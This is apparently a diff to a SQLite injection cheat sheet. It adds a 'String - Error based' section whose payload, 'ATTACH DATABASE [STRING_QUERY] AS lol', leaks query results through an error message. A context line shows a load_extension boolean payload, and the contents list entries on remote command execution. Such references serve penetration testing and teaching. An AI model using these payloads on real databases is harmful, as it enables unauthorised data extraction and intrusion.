@@ -11,6 +11,7 @@
 * [Boolean - Enumerating table name](#boolean---enumerating-table-name)
 * [Boolean - Extract info](#boolean---extract-info)
 * [Boolean - Error based](#boolean---error-based)
+* [String - Error based](#string---error-based)
 * [Time based](#time-based)
 * [Remote Command Execution using SQLite command - Attach Database](#remote-command-execution-using-sqlite-command---attach-database)
 * [Remote Command Execution using SQLite command - Load_extension](#remote-command-execution-using-sqlite-command---load_extension)
@@ -87,6 +88,13 @@ CASE WHEN (SELECT hex(substr(sql,1,1)) FROM sqlite_master WHERE type='table' and
 ```sql
 AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
 ```
+
+## String - Error based
+
+```sql
+ATTACH DATABASE [STRING_QUERY] AS lol
+```
+There will be an error raised with the message: ```unable to open database: [STRING_QUERY]```
 
 ## Time based
 
